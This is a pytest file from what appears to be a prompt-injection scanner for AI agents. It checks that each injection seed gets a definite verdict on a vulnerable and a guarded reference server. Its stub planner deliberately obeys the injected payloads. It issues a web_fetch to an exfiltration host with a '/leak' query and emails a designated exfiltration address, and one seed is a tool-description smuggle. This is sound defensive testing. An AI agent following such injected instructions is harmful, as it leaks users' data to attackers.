"""Every kitchen-sink seed must DECIDE both twins, with no model in the loop.

The structural guard behind issue #145. Three separate predicates shipped able
to report a weakness landing and unable to report it holding — their codomain
was `{Verdict(success=True), None}` — so the guarded half of those differentials
reached no verdict on every run, and `absent evidence is inconclusive` (the house
rule in `docs/weakness-classes.md`) correctly refused to call that a clean pass.
Each was found and fixed one at a time, by reading traces. This file is what
makes the next one fail at review instead.

Why it is model-free: a scripted planner performs exactly the action each seed's
payload asks for, *identically against both servers*. That is deliberate and is
the whole point — a real planner that behaves differently on the guarded build
(declining an attack it attempted on the vulnerable one) leaves the guarded
control unexercised and produces no evidence either way, which is precisely how
the soft `<untrusted>` envelope used to hide the W2 taint gate. Holding planner
behaviour fixed isolates what the *targets* do, which is what the differential
oracle is measuring.

What it does NOT claim: that a real model lands these attacks. That is the
demo's and the validator's job, against a live or recorded provider. This file
pins the weaker, load-bearing property that the evidence is *legible* when it
happens.
"""

from __future__ import annotations

import json
import re
from types import SimpleNamespace
from typing import Any

import pytest

from mylonite.contracts._types import Payload
from mylonite.plugins._reference.reference_target_adapter import InProcessReferenceAdapter
from mylonite.scan.exfil import DEFAULT_EXFIL_EMAIL, DEFAULT_EXFIL_HOST
from mylonite.scan.predicates import lookup_predicate
from mylonite.scan.seeds import SEED_CATALOGUE, SeedPattern

KITCHEN_SINK_SEEDS: tuple[SeedPattern, ...] = tuple(
    seed for seed in SEED_CATALOGUE if "kitchen-sink" in seed.applicable_targets
)

#: The adapter mints a fresh note id per attempt and templates it into the user
#: message. A planner learns it the same way a real one does — by reading the
#: message — rather than by being told out of band.
_NOTE_ID = re.compile(r"\bn_[0-9a-zA-Z_]+\b")


def _text(content: str) -> SimpleNamespace:
    return SimpleNamespace(
        choices=[SimpleNamespace(message=SimpleNamespace(content=content, tool_calls=None))]
    )


def _calls(*calls: SimpleNamespace) -> SimpleNamespace:
    return SimpleNamespace(
        choices=[SimpleNamespace(message=SimpleNamespace(content="", tool_calls=list(calls)))]
    )


def _call(name: str, args: dict[str, Any], call_id: str) -> SimpleNamespace:
    return SimpleNamespace(
        id=call_id, function=SimpleNamespace(name=name, arguments=json.dumps(args))
    )


def _note_id_from(messages: Any) -> str:
    for message in messages or ():
        content = message.get("content") if isinstance(message, dict) else None
        if isinstance(content, str):
            found = _NOTE_ID.search(content)
            if found:
                return found.group(0)
    return "n_unknown"


def _planner_that_falls_for(seed: SeedPattern) -> Any:
    """A planner that takes the action `seed` is about, on either twin.

    Uses the seed's own canonical exfil destinations (`scan.exfil`), not invented
    ones: the predicates key on the destination this payload designated, so a
    planner that mailed some other attacker-shaped address would be correctly
    read as not having followed the payload.
    """
    turn = [0]
    reads_first = seed.setup == "seed_note"

    async def stub(*, messages: Any = (), **_: Any) -> SimpleNamespace:
        turn[0] += 1
        step = turn[0]
        if reads_first and step == 1:
            return _calls(_call("read_note", {"note_id": _note_id_from(messages)}, "c1"))
        if step == (2 if reads_first else 1):
            if seed.weakness == "W3":
                return _calls(
                    _call("web_fetch", {"url": f"http://{DEFAULT_EXFIL_HOST}/leak?d=s"}, "c2")
                )
            if seed.weakness == "W2":
                return _calls(
                    _call(
                        "send_email",
                        {"to": DEFAULT_EXFIL_EMAIL, "subject": "notes", "body": "leak"},
                        "c2",
                    )
                )
            if seed.pattern_id == "tool-description-summary-smuggle":
                # This seed's smuggled action is prose, not a tool call: the
                # description says "always summarise" against a neutral read.
                return _text("In summary: the note lists three items.")
            return _calls(
                _call(
                    "send_email",
                    {"to": "ops@example.com", "subject": "Q3 status", "body": "nominal"},
                    "c2",
                )
            )
        return _text("In summary: done.")

    return stub


def _payload_for(seed: SeedPattern) -> Payload:
    return Payload(
        pattern_id=seed.pattern_id,
        channel=seed.channel,
        body=seed.seed_body,
        metadata={
            "seed_id": seed.pattern_id,
            "weakness": seed.weakness,
            "predicate": seed.predicate,
            "setup": seed.setup,
            "drive": seed.drive,
        },
    )


async def _verdict(seed: SeedPattern, variant: str) -> Any:
    payload = _payload_for(seed)
    adapter = InProcessReferenceAdapter(
        variant=variant, model="stub", completion_fn=_planner_that_falls_for(seed)
    )
    response = await adapter.invoke(payload)
    return lookup_predicate(seed.predicate)(payload, response)


_IDS = [s.pattern_id for s in KITCHEN_SINK_SEEDS]


@pytest.mark.asyncio
@pytest.mark.parametrize("seed", KITCHEN_SINK_SEEDS, ids=_IDS)
async def test_the_vulnerable_twin_is_reported_exploited(seed: SeedPattern) -> None:
    """Ground truth: the attack lands and the predicate SEES it land.

    A `None` here is the failure mode that let a scan come back clean on a
    server that was demonstrably exploited — the effect was in the store and no
    mechanism reported it.
    """
    verdict = await _verdict(seed, "vulnerable")

    assert verdict is not None, (
        f"{seed.pattern_id}: the attack was carried out against the deliberately "
        f"vulnerable twin and {seed.predicate!r} returned no verdict. The "
        "evidence exists in the effect trace; the predicate cannot read it."
    )
    assert verdict.success is True, f"{seed.pattern_id}: {verdict.reason}"


@pytest.mark.asyncio
@pytest.mark.parametrize("seed", KITCHEN_SINK_SEEDS, ids=_IDS)
async def test_the_guarded_twin_is_reported_holding(seed: SeedPattern) -> None:
    """The half that kept regressing: a CONFIDENT negative, not silence.

    `None` means the guarded cell cannot be decided in either direction, so the
    differential has nothing to compare against — the oracle then either refuses
    the finding or, before the 0.10.0 oracle fix, kept it off a guarded twin that
    never demonstrated anything.
    """
    verdict = await _verdict(seed, "guarded")

    assert verdict is not None, (
        f"{seed.pattern_id}: {seed.predicate!r} cannot report that the guard "
        "HELD. Give it a branch that returns a confident success=False on "
        "positively-observed resistance (a refusal in the effect trace, a "
        "deferred/staged result, or a description surface carrying no smuggle) "
        "— never widen it to treat missing evidence as a clean pass."
    )
    assert verdict.success is False, f"{seed.pattern_id}: {verdict.reason}"
    assert verdict.applicable is True, (
        f"{seed.pattern_id}: reported NOT-APPLICABLE against the guarded "
        "reference twin, which exposes every tool these seeds need"
    )
    assert verdict.mechanism == "predicate", "must be deterministic, not model-graded"


@pytest.mark.asyncio
@pytest.mark.parametrize("seed", KITCHEN_SINK_SEEDS, ids=_IDS)
async def test_the_two_twins_actually_disagree(seed: SeedPattern) -> None:
    """The differential itself, per seed: same planner, opposite outcomes.

    Guards against a predicate that is merely *consistent* — one that fired on
    both twins, or held on both — which would decide every cell and discriminate
    nothing.
    """
    fired = await _verdict(seed, "vulnerable")
    held = await _verdict(seed, "guarded")

    assert fired is not None and held is not None
    assert fired.success != held.success, (
        f"{seed.pattern_id}: both twins returned success={fired.success} for one "
        "identical planner — there is no differential here to keep a test on"
    )
